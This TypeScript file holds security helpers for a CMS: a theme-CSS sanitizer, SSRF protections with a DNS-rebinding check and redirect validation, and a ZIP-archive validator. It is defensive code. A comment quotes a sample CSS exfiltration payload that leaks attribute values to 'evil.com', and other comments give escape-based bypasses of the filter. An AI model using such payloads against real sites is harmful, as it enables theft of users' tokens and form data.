import { URL } from 'node:url'

/**
 * Sanitizes theme CSS before it's stored and injected into every public page's <head>
 * (see server/plugins/theme-resolver.ts). Theme CSS is purely declarative styling —
 * colors, spacing, typography via CSS custom properties — and never legitimately needs
 * to load external resources (fonts/images are handled through dedicated site settings,
 * not theme CSS). So `url()` and `@import` are stripped entirely rather than allow-listed.
 *
 * This closes the CSS attribute-selector exfiltration technique — e.g.
 * `input[value^="a"] { background: url(https://evil.com/?leak=a) }`, which can leak DOM
 * attribute values (tokens, form state) character-by-character to an attacker's server
 * purely from CSS matching, no JavaScript required — plus @import-based external
 * stylesheet loading and the legacy IE `expression()` code-execution vector.
 */
// CSS lets any character be escaped as `\` + 1-6 hex digits (+ one optional trailing
// whitespace) or `\` + the literal character itself, and browsers decode these during
// tokenizing — so `\75rl(...)` parses identically to `url(...)`, and `@\69mport`
// identically to `@import`. Decoding escapes before the literal-text strips below closes
// that bypass; run this first so a payload can't use escapes to also hide/split a
// dangerous construct across a comment the way `sanitizeThemeCss` already guards against
// for the unescaped case.
function decodeCssEscapes(css: string): string {
  return css.replace(/\\([0-9a-f]{1,6})[ \t\n\r\f]?|\\([\s\S])/gi, (_match, hex: string | undefined, lit: string | undefined) => {
    if (hex !== undefined) {
      const codePoint = Number.parseInt(hex, 16)
      if (Number.isNaN(codePoint) || codePoint > 0x10FFFF) return ''
      try {
        return String.fromCodePoint(codePoint)
      } catch {
        return ''
      }
    }
    return lit ?? ''
  })
}

export function sanitizeThemeCss(css: string): string {
  let out = decodeCssEscapes(css)
  // Strip comments first so a payload can't hide/split a dangerous construct across
  // one (e.g. "@im/* */port").
  out = out.replace(/\/\*[\s\S]*?\*\//g, '')
  // Strip @import (external stylesheet loading). Matches through the first semicolon;
  // over-consuming on malformed input (missing semicolon) fails closed, not open.
  out = out.replace(/@import\b[^;]*;?/gi, '')
  // Strip url(...) entirely everywhere it appears. Quoted alternatives are tried first
  // so a data: URI containing a literal ')' inside its quotes (routine for inline SVG —
  // transform functions, path data) is consumed in full; a naive `[^)]*` stops at that
  // first embedded ')', replaces only the partial match, and leaves the real remainder
  // of the value (including the true closing ')' and trailing ';') as unescaped garbage
  // text in the stylesheet, corrupting parsing from that point on. Each alternative is a
  // fully self-contained url(...)/expression(...) pattern (not a shared `\s*` suffix
  // outside the alternation) — a shared trailing quantifier that can also be satisfied by
  // the fallback branch is exactly the overlapping-repetition shape that enables
  // super-linear regex backtracking on malformed input.
  out = out.replace(/url\s*\(\s*"[^"]*"\s*\)|url\s*\(\s*'[^']*'\s*\)|url\s*\([^)]*\)/gi, 'none')
  // Strip legacy IE CSS expression() (arbitrary script execution in old IE) — same
  // quoted-string-aware matching, since its argument is a JS-like expression that may
  // itself contain a quoted string with a ')' inside.
  out = out.replace(/\bexpression\s*\(\s*"[^"]*"\s*\)|\bexpression\s*\(\s*'[^']*'\s*\)|\bexpression\s*\([^)]*\)/gi, 'none')
  // Prevent breaking out of the <style> block it's injected into.
  out = out.replace(/<\/style>/gi, '')
  return out
}

export function isPrivateIPv4(host: string): boolean {
  // Check if standard dot-decimal IPv4 representation
  if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(host)) return false
  const parts = host.split('.').map(p => Number.parseInt(p, 10))
  if (parts.some(p => Number.isNaN(p) || p < 0 || p > 255)) return false
  const o1 = parts[0] ?? 0
  const o2 = parts[1] ?? 0
  return (
    o1 === 10 || // 10.0.0.0/8
    o1 === 127 || // 127.0.0.0/8 (loopback)
    o1 === 0 || // 0.0.0.0/8 (broadcast/local)
    (o1 === 172 && o2 >= 16 && o2 <= 31) || // 172.16.0.0/12
    (o1 === 192 && o2 === 168) || // 192.168.0.0/16
    (o1 === 169 && o2 === 254) // 169.254.0.0/16 (link-local)
  )
}

export function isPrivateIPv6(host: string): boolean {
  // Strip outer brackets if present
  const clean = host.startsWith('[') && host.endsWith(']') ? host.slice(1, -1) : host
  const lower = clean.toLowerCase()

  // Loopback / Unspecified
  if (lower === '::1' || lower === '::' || lower === '0:0:0:0:0:0:0:1' || lower === '0:0:0:0:0:0:0:0') {
    return true
  }

  // IPv4-mapped IPv6 (e.g. ::ffff:127.0.0.1 or ::ffff:7f00:1)
  if (lower.includes(':ffff:')) {
    const suffix = lower.split(':ffff:').pop() ?? ''
    if (suffix.includes('.')) {
      if (isPrivateIPv4(suffix)) return true
    } else {
      // Hex representation of IPv4-mapped IPv6
      const parts = suffix.split(':')
      if (parts.length === 2) {
        const w1 = Number.parseInt(parts[0] || '0', 16)
        const w2 = Number.parseInt(parts[1] || '0', 16)
        if (!Number.isNaN(w1) && !Number.isNaN(w2)) {
          const o1 = (w1 >> 8) & 0xFF
          const o2 = w1 & 0xFF
          const o3 = (w2 >> 8) & 0xFF
          const o4 = w2 & 0xFF
          const ipv4Str = `${o1}.${o2}.${o3}.${o4}`
          if (isPrivateIPv4(ipv4Str)) return true
        }
      }
    }
  }

  // Unique Local Addresses (fc00::/7) or Link-local (fe80::/10)
  if (
    lower.startsWith('fc') ||
    lower.startsWith('fd') ||
    lower.startsWith('fe8') ||
    lower.startsWith('fe9') ||
    lower.startsWith('fea') ||
    lower.startsWith('feb')
  ) {
    return true
  }

  return false
}

/**
 * Validates a URL for SSRF prevention.
 * Ensures the protocol is strictly HTTP/HTTPS and host is not loopback, private, or local.
 */
export function isSafeUrl(urlStr: string): boolean {
  try {
    const url = new URL(urlStr)
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return false

    const host = url.hostname.toLowerCase()

    // Block local hostnames
    if (host === 'localhost') return false

    // Block local domain endings
    if (host.endsWith('.local') || host.endsWith('.internal')) return false

    // Block private IPv4
    if (isPrivateIPv4(host)) return false

    // Block private IPv6
    if (isPrivateIPv6(host)) return false

    return true
  } catch {
    return false
  }
}

function isIpLiteral(host: string): boolean {
  const clean = host.startsWith('[') && host.endsWith(']') ? host.slice(1, -1) : host
  return /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(clean) || clean.includes(':')
}

async function resolveViaDoh(hostname: string, type: 'A' | 'AAAA'): Promise<string[]> {
  const res = await fetch(
    `https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(hostname)}&type=${type}`,
    { headers: { accept: 'application/dns-json' } },
  )
  if (!res.ok) return []
  const json = await res.json() as { Answer?: { type: number; data: string }[] }
  const wantType = type === 'A' ? 1 : 28
  return (json.Answer ?? []).filter(a => a.type === wantType).map(a => a.data)
}

/**
 * Resolves `hostname` and checks whether ANY of its addresses land in a private/loopback
 * range — closes the DNS-rebinding gap in `isSafeUrl`, which only inspects the literal
 * host string. `isSafeUrl` passes a domain that merely *looks* public (e.g. one an
 * attacker controls and points at 127.0.0.1 or 169.254.169.254), because the string
 * itself contains no private-looking bytes; the SSRF only becomes real once something
 * actually resolves and connects to it. Workers has no raw DNS API, so this uses
 * Cloudflare's own DNS-over-HTTPS resolver — the standard mitigation for this class of
 * bug in a runtime where `fetch()`'s own resolution is opaque to the caller.
 */
export async function resolvesToPrivateIp(hostname: string): Promise<boolean> {
  const host = hostname.toLowerCase()
  if (isIpLiteral(host)) {
    return isPrivateIPv4(host) || isPrivateIPv6(host)
  }
  try {
    const [v4, v6] = await Promise.all([resolveViaDoh(host, 'A'), resolveViaDoh(host, 'AAAA')])
    if (v4.length === 0 && v6.length === 0) return true // unresolvable — fail closed
    return v4.some(isPrivateIPv4) || v6.some(isPrivateIPv6)
  } catch {
    return true // DoH lookup failed — fail closed rather than let an unverified host through
  }
}

const SAFE_FETCH_MAX_REDIRECTS = 5

/**
 * SSRF-hardened fetch for admin-supplied or content-embedded URLs (WordPress import image
 * fetch, backup media bundling, and similar). Layers on top of `isSafeUrl`: re-validates
 * the hostname against `resolvesToPrivateIp` (DNS-rebinding check) immediately before each
 * network call, and re-validates every redirect hop the same way instead of letting
 * `fetch()` follow a redirect straight into a private address.
 *
 * Throws a plain `Error` (not an H3 `createError`) for policy violations so existing call
 * sites that wrap `fetch()` in try/catch and skip-on-failure (rather than aborting the
 * whole operation) keep that behavior unchanged — a single disallowed URL is treated the
 * same as a single network failure, not a fatal request error.
 */
export async function safeFetch(urlStr: string, init?: RequestInit): Promise<Response> {
  if (!isSafeUrl(urlStr)) {
    throw new Error(`URL is not allowed: ${urlStr}`)
  }

  let current = urlStr
  for (let hop = 0; hop <= SAFE_FETCH_MAX_REDIRECTS; hop++) {
    const url = new URL(current)
    if (await resolvesToPrivateIp(url.hostname)) {
      throw new Error(`URL resolves to a disallowed address: ${current}`)
    }

    const res = await fetch(current, { ...init, redirect: 'manual' })
    if (res.status >= 300 && res.status < 400) {
      const location = res.headers.get('location')
      if (!location) return res
      const next = new URL(location, current).toString()
      if (!isSafeUrl(next)) {
        throw new Error(`Redirect target is not allowed: ${next}`)
      }
      current = next
      continue
    }
    return res
  }
  throw new Error(`Too many redirects fetching: ${urlStr}`)
}

/**
 * Parses the Central Directory of a ZIP archive in memory (without decompressing the files)
 * to validate file path traversals (Zip Slip) and total uncompressed size (Zip Bomb).
 */
export function validateZipArchive(
  data: Uint8Array,
  maxUncompressedSize: number
): { fileCount: number; totalSize: number } {
  const len = data.length

  // 1. Search for End of Central Directory (EOCD) signature (0x06054b50) from the end
  let eocdOffset = -1
  for (let i = len - 22; i >= Math.max(0, len - 65535 - 22); i--) {
    if (
      data[i] === 0x50 &&
      data[i + 1] === 0x4B &&
      data[i + 2] === 0x05 &&
      data[i + 3] === 0x06
    ) {
      eocdOffset = i
      break
    }
  }

  if (eocdOffset === -1) {
    throw createError({
      statusCode: 400,
      message: 'Invalid zip file: EOCD record not found',
    })
  }

  const view = new DataView(data.buffer, data.byteOffset, data.byteLength)

  // Total number of central directory records
  const totalRecords = view.getUint16(eocdOffset + 10, true)
  // Size of central directory
  const cdSize = view.getUint32(eocdOffset + 12, true)
  // Offset of central directory
  const cdOffset = view.getUint32(eocdOffset + 16, true)

  if (cdOffset + cdSize > len) {
    throw createError({
      statusCode: 400,
      message: 'Invalid zip file: central directory out of bounds',
    })
  }

  let currentOffset = cdOffset
  let totalUncompressedSize = 0
  let fileCount = 0

  // 2. Iterate through each Central Directory entry
  for (let r = 0; r < totalRecords; r++) {
    if (currentOffset + 46 > len) {
      throw createError({
        statusCode: 400,
        message: 'Invalid zip file: truncated central directory header',
      })
    }

    const sig = view.getUint32(currentOffset, true)
    if (sig !== 0x02014B50) {
      throw createError({
        statusCode: 400,
        message: `Invalid zip file: incorrect central directory signature at offset ${currentOffset}`,
      })
    }

    const uncompressedSize = view.getUint32(currentOffset + 24, true)
    const nameLen = view.getUint16(currentOffset + 28, true)
    const extraLen = view.getUint16(currentOffset + 30, true)
    const commentLen = view.getUint16(currentOffset + 32, true)

    const recordSize = 46 + nameLen + extraLen + commentLen
    if (currentOffset + recordSize > len) {
      throw createError({
        statusCode: 400,
        message: 'Invalid zip file: central directory record out of bounds',
      })
    }

    // Extract filename and check for path traversal
    const fileNameBytes = data.subarray(currentOffset + 46, currentOffset + 46 + nameLen)
    const fileName = new TextDecoder().decode(fileNameBytes).replace(/\\/g, '/')

    if (
      fileName.includes('..') ||
      fileName.startsWith('/') ||
      fileName.startsWith('\\') ||
      /^[a-z]:/i.test(fileName) // Block Windows drive letters (e.g. C:)
    ) {
      throw createError({
        statusCode: 400,
        message: `Directory traversal detected in zip entry: ${fileName}`,
      })
    }

    totalUncompressedSize += uncompressedSize
    fileCount++

    if (totalUncompressedSize > maxUncompressedSize) {
      throw createError({
        statusCode: 413,
        message: `Decompression limit exceeded: total uncompressed size exceeds ${Math.floor(
          maxUncompressedSize / (1024 * 1024)
        )} MB`,
      })
    }

    currentOffset += recordSize
  }

  return { fileCount, totalSize: totalUncompressedSize }
}
